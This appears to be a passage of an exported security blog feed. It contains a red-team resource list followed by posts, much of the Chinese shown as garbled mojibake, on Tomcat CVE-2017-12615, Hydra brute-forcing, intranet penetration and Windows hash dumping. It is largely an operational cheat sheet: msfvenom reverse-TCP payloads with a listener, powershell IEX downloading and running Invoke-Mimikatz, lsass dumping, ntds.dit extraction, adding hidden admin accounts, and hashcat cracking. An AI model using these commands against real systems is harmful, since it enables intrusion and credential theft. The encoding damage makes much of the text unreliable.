Egressing Restricted Networks - Tom Steele and Chris Patten Finding Frontable Domain TOR Fronting â€“ Utilising Hidden Services for Privacy Simple domain fronting PoC with GAE C2 server Domain Fronting Via Cloudfront Alternate Domains Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate) Google Groups: Blog post on finding 2000+ Azure domains using Censys Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike SSL Domain Fronting 101 How I Identified 93k Domain-Frontable CloudFront Domains Validated CloudFront SSL Domains CloudFront Hijacking CloudFrunt GitHub Repo Connection Proxy Redirecting Cobalt Strike DNS Beacons Apache2Mod Rewrite Setup Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite High-reputation Redirectors and Domain Fronting Cloud-based Redirectors for Distributed Hacking Combatting Incident Responders with Apache mod_rewrite Operating System Based Redirection with Apache mod_rewrite Invalid URI Redirection with Apache mod_rewrite Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection mod_rewrite rule to evade vendor sandboxes Expire Phishing Links with Apache RewriteMap Serving random payloads with NGINX Mod_Rewrite Automatic Setup Hybrid Cobalt Strike Redirectors Expand Your Horizon Red Team â€“ Modern SAAS C2 RTOps: Automating Redirector Deployment With Ansible Web Services C2 with Dropbox C2 with gmail C2 with twitter Office 365 for Cobalt Strike C2 Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike A stealthy Python based Windows backdoor that uses Github as a C&amp;C server External C2 (Third-Party Command and Control) Cobalt Strike over external C2 â€“ beacon home in the most obscure ways External C2 for Cobalt Strike External C2 framework for Cobalt Strike External C2 framework - GitHub Repo Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs Exploring Cobalt Strikeâ€™s ExternalC2 framework Application Layer Protocol C2 WebSocket C2 WMI C2 Website C2 Image C2 Javascript C2 WebInterface C2 with DNS C2 with https C2 with webdav Introducing Merlin â€” A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool InternetExplorer.Application for C2 Infrastructure Automated Red Team Infrastructure Deployment with Terraform - Part 1 Automated Red Team Infrastructure Deployment with Terraform - Part 2 Red Team Infrastructure - AWS Encrypted EBS 6 RED TEAM INFRASTRUCTURE TIPS How to Build a C2 Infrastructure with Digital Ocean â€“ Part 1 Infrastructure for Ongoing Red Team Operations Attack Infrastructure Log Aggregation and Monitoring Randomized Malleable C2 Profiles Made Easy Migrating Your infrastructure ICMP C2 Using WebDAV features as a covert channel Safe Red Team Infrastructure EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LETâ€™S ENCRYPT Command and Control Using Active Directory A Vision for Distributed Red Team Operations Designing Effective Covert Red Team Attack Infrastructure Serving Random Payloads with Apache mod_rewrite Mail Servers Made Easy Securing your Empire C2 with Apache mod_rewrite Automating Gophish Releases With Ansible and Docker How to Write Malleable C2 Profiles for Cobalt Strike How to Make Communication Profiles for Empire A Brave New World: Malleable C2 Malleable Command and Control â†‘ Embedded and Peripheral Devices Hacking Gettting in with the Proxmark3 &amp; ProxBrute Practical Guide to RFID Badge copying Contents of a Physical Pentester Backpack MagSpoof - credit card/magstripe spoofer Wireless Keyboard Sniffer RFID Hacking with The Proxmark 3 Swiss Army Knife for RFID Exploring NFC Attack Surface Outsmarting smartcards Reverse engineering HID iClass Master keys Android Open Pwn Project (AOPP) â†‘ Misc Red Tips of Vysec Cobalt Strike Tips for 2016 ccde red teams Models for Red Team Operations Planning a Red Team exercise Raphael Mudge - Dirty Red Team tricks introducing the adversary resilience methodology part 1 introducing the adversary resilience methodology part 2 Responsible red team Red Teaming for Pacific Rim CCDC 2017 How I Prepared to Red Team at PRCCDC 2015 Red Teaming for Pacific Rim CCDC 2016 Responsible Red Teams â†‘ RedTeam GadgetsNetwork Implants LAN Tap Pro LAN Turtle Bash Bunny Packet SquirrelWifi Auditing WiFi Pineapple Alpha Long range Wireless USB Wifi-Deauth Monster Crazy PAIoT BLE Key Proxmark3 Zigbee Sniffer Attify IoT Exploit kitSoftware Defined Radio - SDR HackRF One Bundle RTL-SDR YARD stick one Bundle UbertoothMisc Key Grabber Magspoof Poison tap keysweeper USB Rubber Ducky â†‘ Ebooks Next Generation Red Teaming Targeted Cyber Attack Advanced Penetration Testing: Hacking the Worldâ€™s Most Secure Networks Social Engieersâ€™ Playbook Pretical Pretexting â†‘ Training ( Free ) Tradecraft - a course on red team operations Advanced Threat Tactics Course &amp; Notes â†‘ Certification CREST Certified Simulated Attack Specialist CREST Certified Simulated Attack Manager SEC564: Red Team Operations and Threat Emulation ELearn Security Penetration Testing eXtreme]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-12615æ¼æ´žå¤çŽ°]]></title>
    <url>%2F2019%2F02%2F28%2FCVE-2017-12615.html</url>
    <content type="text"><![CDATA[æ¼æ´žåˆ©ç”¨æ¡ä»¶å’Œæ–¹å¼: CVE-2017-12615æ¼æ´žåˆ©ç”¨éœ€è¦åœ¨WindowsçŽ¯å¢ƒï¼Œä¸”éœ€è¦å°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼Œç»è¿‡å®žé™…æµ‹è¯•ï¼ŒTomcat 7.xç‰ˆæœ¬å†…web.xmlé…ç½®æ–‡ä»¶å†…é»˜è®¤é…ç½®æ— readonlyå‚æ•°ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ ï¼Œé»˜è®¤é…ç½®æ¡ä»¶ä¸‹ä¸å—æ­¤æ¼æ´žå½±å“ã€‚ CVE-2017-12616å½±å“èŒƒå›´ï¼šApache Tomcat 7.0.0 - 7.0.80 CVE-2017-12615å½±å“èŒƒå›´ï¼š Apache Tomcat 7.0.0 - 7.0.79 å®‰è£…tomcat U:test P:test123 JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25 CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; Path= %JAVA_HOME%/bin æ–°å¢ž2ä¸ªå˜é‡ CATALINA_HOME= tomcatè·¯å¾„ CATALINA_BASE= tomcatè·¯å¾„ CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar 1ã€å¼€å§‹â€”-æŽ§åˆ¶é¢æ¿â€”-ç³»ç»Ÿå’Œå®‰å…¨â€”-windowsé˜²ç«å¢™â€”-é«˜çº§è®¾ç½® 2ã€é€‰æ‹©â€œå…¥ç«™è§„åˆ™â€â€”-ç‚¹å‡»â€œæ–°å»ºè§„åˆ™â€â€”-â€œè§„åˆ™ç±»åž‹â€é€‰æ‹©â€œç«¯å£â€â€”-â€œä¸‹ä¸€æ­¥â€â€”-è¯¥è§„åˆ™åº”ç”¨äºŽï¼Œé€‰æ‹©â€œTCPâ€â€”-â€œç‰¹å®šæœ¬åœ°ç«¯å£â€è¾“å…¥â€œ8080â€(Tomcatä½¿ç”¨çš„ç«¯å£)â€”-â€œä¸‹ä¸€æ­¥â€â€”-é€‰æ‹©â€œå…è®¸è¿žæŽ¥â€ï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â€â€”-ä½•æ—¶åº”ç”¨è¯¥è§„åˆ™ï¼Œé»˜è®¤å…¨é€‰ï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â€â€”-ä¸ºè¯¥è§„åˆ™èµ·ä¸€ä¸ªåç§°ï¼Œå¦‚â€œTomcatå¼€æ”¾8080ç«¯å£â€â€”-ç‚¹å‡»â€œå®Œæˆâ€ 3ã€Server.xml 123&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;connectionTimeout=&quot;20000&quot;redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt; C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml å¢žåŠ  123456 &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt; æç¤º 404ã€‚é€šè¿‡æè¿°ä¸­çš„ Windows å—å½±å“ï¼Œå¯ä»¥ç»“åˆ Windows çš„ç‰¹æ€§ã€‚å…¶ä¸€æ˜¯ NTFS æ–‡ä»¶æµï¼Œå…¶äºŒæ˜¯æ–‡ä»¶åçš„ç›¸å…³é™åˆ¶ï¼ˆå¦‚ Windows ä¸­æ–‡ä»¶åä¸èƒ½ä»¥ç©ºæ ¼ç»“å°¾ï¼‰æ¥ç»•è¿‡é™åˆ¶ï¼š 7.0.81]]></content>
      <categories>
        <category>æ¼æ´žå¤çŽ°</category>
      </categories>
      <tags>
        <tag>æ¼æ´žå¤çŽ°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hydra çš„ä½¿ç”¨]]></title>
    <url>%2F2019%2F02%2F26%2Fhydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[å­—å…¸é›†https://www.weakpass.com/1.ç ´è§£sshï¼ˆ1ï¼‰ç ´è§£æŒ‡å®šç”¨æˆ·åå¯†ç  hydra ip ssh -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vVhydra ip ssh -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV ï¼ˆ2ï¼‰æ‰¹é‡ç ´è§£sshè´¦å·å’Œå¯†ç  hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -Vhydra -L list_user -P list_password 192.168.56.101 ssh -V 2.ç ´è§£ftp ï¼ˆ1ï¼‰ç ´è§£æŒ‡å®šç”¨æˆ·åå¯†ç  hydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vVhydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV ï¼ˆ2ï¼‰æ‰¹é‡ç ´è§£FTPè´¦å·å’Œå¯†ç  hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -Vhydra -L list_user -P list_password 192.168.56.101 ftp -V 3ï¼ŽGETæ–¹å¼æäº¤ï¼Œç ´è§£Webç™»å½• hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip http-get /admin/hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns -f ip http-get /admin/index.php 4ï¼ŽPOSTæ–¹å¼æäº¤ï¼Œç ´è§£Webç™»å½•4ï¼ŽPOSTæ–¹å¼æäº¤ï¼Œç ´è§£Webç™»å½• ï¼ˆ1ï¼‰hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s 80 ip http-post-form â€œ/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry passwordâ€ hydra -L list_user -P list_password 192.168.0.115 http-post-form â€œmember.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failedâ€ â€“V ï¼ˆ2ï¼‰å¯¹adminå¯†ç è¿›è¡Œç ´è§£ hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form â€œlogin.php:id=^USER^&amp;passwd=^PASS^:wrong username or passwordâ€œ â€œ-tâ€è¡¨ç¤ºåŒæ—¶çº¿ç¨‹æ•°ä¸º3ï¼›â€œ-lâ€è¡¨ç¤ºç”¨æˆ·åæ˜¯â€œadminâ€ï¼Œå­—å…¸ä¸ºpass.txtï¼Œä¿å­˜ä¸ºout.txtï¼›â€œ-fâ€è¡¨ç¤ºç ´è§£1ä¸ªå¯†ç å°±åœæ­¢ï¼›â€œ192.168.0.115â€è¡¨ç¤ºç›®æ ‡IPåœ°å€ï¼›â€œhttp-post-formâ€è¡¨ç¤ºé‡‡ç”¨HTTPçš„POSTæ–¹å¼æäº¤è¡¨å•å¯†ç ç ´è§£ï¼› 5ï¼Žç ´è§£HTTPS hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https 6ï¼Žç ´è§£teamspeak hydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s ç«¯å£å· -vV ip teamspeak 7ï¼Žç ´è§£Cisco hydra -P pass.txt 192.168.0.115 ciscohydra -m cloud -P pass.txt 192.168.0.115 cisco-enable 8ï¼Žç ´è§£SMB hydra -l administrator -P pass.txt 192.168.0.115 smb 9ï¼Žç ´è§£POP3 hydra -l muts -P pass.txt my.pop3.mail pop3 10ï¼Žç ´è§£è¿œç¨‹ç»ˆç«¯è´¦å· ï¼ˆ1ï¼‰ç ´è§£ç®¡ç†å‘˜è´¦å· hydra ip rdp -l administrator -P pass.txt -V ï¼ˆ2ï¼‰æ‰¹é‡ç ´è§£è´¦å· hydra -s 3389 192.168.44.138 rdp -L user.txt -P pwd.txt â€“V 11ï¼Žç ´è§£HTTP-Proxy hydra -l admin -P pass.txt http-proxy://192.168.0.115 12ï¼Žç ´è§£IMAP hydra -L user.txt -p secret 192.168.0.115 imap PLAINhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å†…ç½‘æ¸—é€å°è®°]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html</url>
    <content type="text"><![CDATA[å¸¸ç”¨ä¸€å¥è¯webshellhttps://github.com/tennc/webshell ä¿¡æ¯æ”¶é›†1234567891011121314151617181920212223242526272829303132333435363738dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt; æŸ¥çœ‹dnsåˆ—è¡¨ï¼ˆDCæ‰§è¡Œï¼‰tasklist /SVC æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹åŠå…¶æè¿°query user || qwinsta æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·net user æŸ¥çœ‹æœ¬æœºç”¨æˆ·net user /domain æŸ¥çœ‹åŸŸç”¨æˆ·net view &amp; net group &quot;domain computers&quot; /domain æŸ¥çœ‹å½“å‰åŸŸè®¡ç®—æœºåˆ—è¡¨ ç¬¬äºŒä¸ªæŸ¥çš„æ›´å¤šnet view /domain æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸnet view \\\\dc æŸ¥çœ‹ dc åŸŸå†…å…±äº«æ–‡ä»¶net group /domain æŸ¥çœ‹åŸŸé‡Œé¢çš„ç»„net group &quot;domain admins&quot; /domain æŸ¥çœ‹åŸŸç®¡net localgroup administrators /domain /è¿™ä¸ªä¹Ÿæ˜¯æŸ¥åŸŸç®¡ï¼Œæ˜¯å‡çº§ä¸ºåŸŸæŽ§æ—¶ï¼Œæœ¬åœ°è´¦æˆ·ä¹Ÿæˆä¸ºåŸŸç®¡net group &quot;domain controllers&quot; /domain åŸŸæŽ§net time /domain net config workstation å½“å‰ç™»å½•åŸŸ - è®¡ç®—æœºå - ç”¨æˆ·ånet use \\\\åŸŸæŽ§(å¦‚pc.xx.com) password /user:xxx.com\username ç›¸å½“äºŽè¿™ä¸ªå¸å·ç™»å½•åŸŸå†…ä¸»æœºï¼Œå¯è®¿é—®èµ„æºipconfigsysteminfotasklist /svc è¯¦ç»†è¿›ç¨‹ä¿¡æ¯tasklist /S ip /U domain\username /P /V æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœº tasklisttaskkill /im imagename /f ç»“æŸè¿›ç¨‹net localgroup administrators &amp;&amp; whoami æŸ¥çœ‹å½“å‰æ˜¯ä¸æ˜¯å±žäºŽç®¡ç†ç»„netstat -anonltest /dclist:xx æŸ¥çœ‹åŸŸæŽ§nltest /domain_trusts æŸ¥çœ‹åŸŸä¿¡ä»»ä¿¡æ¯whoami /all æŸ¥çœ‹ Mandatory Label uac çº§åˆ«å’Œ sid å·net sessoin æŸ¥çœ‹è¿œç¨‹è¿žæŽ¥ session (éœ€è¦ç®¡ç†æƒé™)net share å…±äº«ç›®å½•cmdkey /l æŸ¥çœ‹ä¿å­˜ç™»é™†å‡­è¯echo %logonserver% æŸ¥çœ‹ç™»é™†åŸŸspn â€“l administrator spn è®°å½•set çŽ¯å¢ƒå˜é‡dsquery server - æŸ¥æ‰¾ç›®å½•ä¸­çš„ AD DC/LDS å®žä¾‹dsquery user - æŸ¥æ‰¾ç›®å½•ä¸­çš„ç”¨æˆ·dsquery computer æŸ¥è¯¢æ‰€æœ‰è®¡ç®—æœºåç§° windows 2003dir /s *.exe æŸ¥æ‰¾æŒ‡å®šç›®å½•ä¸‹åŠå­ç›®å½•ä¸‹æ²¡éšè—æ–‡ä»¶arp -atracert æŸ¥è·¯ç”± windows ä¸‹è½½æ–‡ä»¶ bitsadmin 12downloadæ–‡ä»¶bitsadmin /transfer n https://www.baidu.com/robots.txt c:\1.txt powershell 12345ä¸€æ¡å‘½ä»¤downloadæ–‡ä»¶powershell (new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/robots.txt','C:\1.txt')å¤šæ¡å‘½ä»¤downloadæ–‡ä»¶$client = new-object System.Net.WebClient$client.DownloadFile('https://www.baidu.com/robots.txt', 'C:\1.txt') certutil.exe 1cmd.exe /c certutil.exe -urlcache -split -f https://www.baidu.com/robots.txt æ·»åŠ åˆ é™¤ç”¨æˆ·æ“ä½œ 12net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add æ·»åŠ ç”¨æˆ·å¹¶è®¾ç½®ç®¡ç†å‘˜net user admin1 /del å†…ç½‘ä»£ç†å·¥å…·EWtools:http://rootkiter.com/EarthWormæ­£å‘ï¼šè¢«æ”»å‡»æœº(è·³æ¿)ï¼š ./ew_for_Linux -s ssocksd -l 9999 (ä¾¦å¬ 0.0.0.0:9999)netstat -pantu|grep 9999 (æŸ¥çœ‹æ˜¯å¦ä¾¦å¬æˆåŠŸ) æ”»å‡»æœºï¼š proxychain è®¾ç½® socks5 ä¸ºè·³æ¿ ip portproxychain nmap å³å¯ä»¥ç”¨è·³æ¿ä»£ç†æ‰«æå…¶ä»–ä¸»æœº netsh Windows è‡ªå¸¦å·¥å…· windows ç«¯å£è½¬å‘123netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4 connectport=8880netsh interface portproxy show v4tov4netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=53 MSFåå¼¹ shell msfvenom -a x86 â€“platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe 1.ç”Ÿæˆä¸€ä¸ªå›žè¿žæœ¨é©¬ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll 2.ç”Ÿæˆæœ¨é©¬åŽï¼Œæˆ‘ä»¬åœ¨èœåˆ€é‡Œæ”¾å…¥ç”Ÿæˆçš„æœ¨é©¬ï¼Œè¿è¡Œï¼ŒåŒæ—¶æ‰“å¼€msfå‡†å¤‡å›žè¿ž use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset LHOST 192.168.2.111set lport 443run 4.ææƒ background æˆ– ctrl+z use exploit/windows/local/ms11_080_afdjoinleafset session 1runhashdump //å¯†ç èŽ·å–load mimikatz //ä½¿ç”¨mimikatzkerberos //æŸ¥çœ‹è§£å¯† 5.æ–°åŠ è·¯ç”±æŸ¥çœ‹å­ç½‘ routebackgroundsessionsroute add 192.168.2.0 255.255.255.0 2search mssql //æ‰¾mssqlæ¨¡å—use auxiliary/scanner/mssql/mssql_login //ä½¿ç”¨loginæ¨¡å— show options set rhosts 192.168.177.1/24 set password sa@123runshow optionsset BEUTEFORCE_SPEED 0run ç«¯å£æ‰«æsearch portscan use auxiliary/scanner/portscan/tcp //ä½¿ç”¨scanneræ¨¡å—show optionsset RHOSTS 192.168.2.0/24set ports 139,445,3389 //è®¾ç½®æ‰«æç«¯å£ ipc$ D:&gt;net use \192.168.1.254\c$ â€œpwdâ€ /user:user //è¿žæŽ¥192.168.1.254çš„IPC$å…±äº«ï¼Œç”¨uncè·¯å¾„D:&gt;copy srv.exe \192.168.1.254\c$ //å¤åˆ¶æœ¬åœ° srv.exe åˆ°Cæ ¹ç›®å½•D:&gt;net time \192.168.1.254 //æŸ¥æ—¶é—´D:&gt;at \192.168.1.254 10:50 srv.exe //ç”¨atå‘½ä»¤åœ¨10ç‚¹50åˆ†å¯åŠ¨ srv.exeD:&gt;net use \192.168.1.254\c$ /del]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hashcat Readme]]></title>
    <url>%2F2019%2F01%2F18%2Fhashcat-readme.html</url>
    <content type="text"><![CDATA[#################################################################&amp; hashcat4.0.1 or 4.1.0 &amp; ################################################################# hash r.txtæ–‡ä»¶æ ¼å¼ ç”¨æˆ·å:hash â€“show å¯¼å‡ºå·²ç ´è§£çš„ç”¨æˆ·å:å¯†ç  outr.txt hashcat64.exe -a 3 -m 1000 â€“show â€“outfile=C:\Users\hash\Desktop\outr.txt â€“outfile-format 3 â€“username c:\Users\hash\Desktop\r.txt â€“left å¯¼å‡ºæœªç ´è§£çš„ç”¨æˆ·å:hash leftr.txt hashcat64.exe -a 3 -m 1000 â€“left â€“outfile=C:\Users\hash\Desktop\leftr.txt â€“outfile-format 1 â€“username c:\Users\hash\Desktop\r.txt å¢žåŠ å¯†ç å¤æ‚åº¦å‘½ä»¤ç ´è§£leftr.txtï¼ˆæœªç ´è§£çš„ç”¨æˆ·å:hashï¼‰ hashcat64.exe -a 3 -m 1000 â€“outfile=C:\Users\hash\Desktop\outr1.txt â€“outfile-format 3 â€“username c:\Users\hash\Desktop\leftr.txt â€“increment â€“increment-min=6 â€“increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a â€“force ç»“æŸä»¥åŽå¯¼å‡ºæœªçˆ†ç ´ç”¨æˆ·ååŠ hash.txt hashcat64.exe -a 3 -m 1000 â€“left â€“outfile=C:\Users\hash\Desktop\leftr2.txt â€“outfile-format 1 â€“username c:\Users\hash\Desktop\leftr.txt hashcat64.exe -a 3 -m 1000 â€“outfile=C:\Users\hash\Desktop\out-1.txt â€“outfile-format 3 â€“username c:\Users\hash\Desktop\1.txt â€“increment â€“increment-min=6 â€“increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a â€“force]]></content>
      <categories>
        <category>å¯†ç ç ´è§£</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿]]></title>
    <url>%2F2018%2F10%2F18%2F%E6%8A%93hash.html</url>
    <content type="text"><![CDATA[æŠ“å– Windows ç”¨æˆ·æˆ–è€…åŸŸç”¨æˆ· hash çš„å¤šç§å§¿åŠ¿ Ntds.ditæ˜¯ä¸»è¦çš„ADæ•°æ®åº“ï¼ŒåŒ…æ‹¬æœ‰å…³åŸŸç”¨æˆ·ï¼Œç»„å’Œç»„æˆå‘˜èº«ä»½çš„ä¿¡æ¯ã€‚å®ƒè¿˜åŒ…æ‹¬åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ã€‚ä¸ºäº†è¿›ä¸€æ­¥ä¿æŠ¤å¯†ç å“ˆå¸Œå€¼ï¼Œä½¿ç”¨å­˜å‚¨åœ¨SYSTEMæ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­çš„å¯†é’¥å¯¹è¿™äº›å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚ç¬¬äºŒä¸ªåŠ å¯†æ­¥éª¤æ˜¯ä¸ºäº†æ‰§è¡Œå¯†ç è½¬å‚¨ä»¥è¿›è¡Œå®¡è®¡ï¼Œéœ€è¦ä¸¤ä¸ªæ–‡ä»¶çš„å‰¯æœ¬ã€‚ æ‰§è¡Œå¯†ç å®‰å…¨å®¡æ ¸æ‰€éœ€çš„ä¸»è¦æ­¥éª¤æ˜¯èŽ·å–åŒ…å«ä¿¡æ¯çš„æ–‡ä»¶ï¼Œä»Žæ–‡ä»¶ä¸­è½¬å‚¨å¯†ç å“ˆå¸Œå€¼ï¼Œç„¶åŽä½¿ç”¨å¯†ç ç ´è§£ç¨‹åºæµ‹è¯•å¼±å¯†ç çš„è¿™äº›å“ˆå¸Œå€¼ã€‚ é€šè¿‡èŽ·å–Ntds.ditå’ŒSYSTEMæ–‡ä»¶çš„å‰¯æœ¬ï¼Œæœ€å¯é çš„æ‰§è¡Œå¯†ç å®¡è®¡çš„æ–¹æ³•æ˜¯è„±æœºçš„ã€‚ç”±äºŽWindowsé˜»æ­¢è¿™äº›æ“ä½œé˜»æ­¢æ ‡å‡†è¯»å–æˆ–å¤åˆ¶ï¼Œå› æ­¤å¿…é¡»ä½¿ç”¨ç‰¹æ®ŠæŠ€æœ¯æ¥èŽ·å–å‰¯æœ¬ã€‚ ä½¿ç”¨mimikatzæœ¬æœºæµ‹è¯•ç›´æŽ¥èŽ·å–å†…å­˜ä¸­çš„æ˜Žæ–‡å¯†ç  mimikatz åªèƒ½æŠ“å–ç™»é™†è¿‡çš„ç”¨æˆ·hashï¼Œæ— æ³•æŠ“å–æ‰€æœ‰ç”¨æˆ·,éœ€è¦å…æ€ 12privilege::debugsekurlsa::logonpasswords éžäº¤äº’å¼æŠ“æ˜Žæ–‡å¯†ç (webshellä¸­) 1mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" &gt; password.txt powershellåŠ è½½mimikatzæŠ“å–å¯†ç  1powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz ProcDump + Mimikatz ==ps:mimikatzçš„å¹³å°ï¼ˆplatformï¼‰è¦ä¸Žè¿›è¡Œdumpçš„ç³»ç»Ÿ(source dump)å…¼å®¹(æ¯”å¦‚ç›®æ ‡08çš„,æœ¬åœ°å°±è¦ç”¨08ç³»ç»Ÿæ¥åˆ†æž)== è¿œç¨‹ä¸»æœºï¼š 12Procdump.exe -accepteula -ma lsass.exe c:\a.dmp æˆ–è€…ä»»åŠ¡ç®¡ç†å™¨æ‰¾åˆ°lsass.exeè¿›ç¨‹å³é”®åˆ›å»ºè½¬å‚¨æ–‡ä»¶ æœ¬åœ°ä¸»æœºï¼šmimikatz 12sekurlsa::minidump a.dmpsekurlsa::logonpasswords full ntds.dit çš„å¯¼å‡º ntdsutil win2008å¼€å§‹DCä¸­è‡ªå¸¦çš„å·¥å…·äº¤äº’å¼12345678ntdsutilsnapshotactivate instance ntdscreatemount [GUID]//copy å®Œä¹‹åŽå†æ‰§è¡Œunmout [GUID]del [GUID] éžäº¤äº’1234ntdsutil snapshot "activate instance ntds" create quit quitntdsutil snapshot "mount &#123;GUID&#125;" quit quitcopy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.ditntdsutil snapshot "unmount &#123;GUID&#125;" "delete &#123;GUID&#125;" quit quit QuarkPwDumpåˆ†æž https://github.com/quarkslab/quarkspwdump åœ¨çº¿æå–ï¼ˆç›´æŽ¥åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼Œå®žæˆ˜ä¸­ä¸é€‰æ‹©æ­¤æ–¹å¼ã€‚ï¼‰1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit ç¦»çº¿æå– éœ€è¦ä¸¤ä¸ªæ–‡ä»¶ ntds.dit å’Œ system.hive ï¼Œ å…¶ä¸­system.hiveå¯é€šè¿‡reg save hklm\system system.hiveèŽ·å– 1QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt WINDOWS SERVER 2008-2016123456C:\&gt; ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit è§£å‡ºntdsçš„hash 1NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;SYSTEM&quot; -p pwdump.txt --users-csv users.csv NtdsAudit.exeä¸‹è½½åœ°å€ NtdsAuditéœ€è¦ntds.dit Active Directoryæ•°æ®åº“ï¼ŒSYSTEM å¦‚æžœè½¬å‚¨å¯†ç å“ˆå¸Œï¼Œåˆ™éœ€è¦æ³¨å†Œè¡¨é…ç½®å•å…ƒã€‚è¿™äº›æ–‡ä»¶ç”±åŸŸæŽ§åˆ¶å™¨é”å®šï¼Œå› æ­¤æ— æ³•ç®€å•åœ°å¤åˆ¶å’Œç²˜è´´ã€‚ä»ŽåŸŸæŽ§åˆ¶å™¨èŽ·å–è¿™äº›æ–‡ä»¶çš„æŽ¨èæ–¹æ³•æ˜¯ä½¿ç”¨å†…ç½®ntdsutilå®žç”¨ç¨‹åºã€‚ 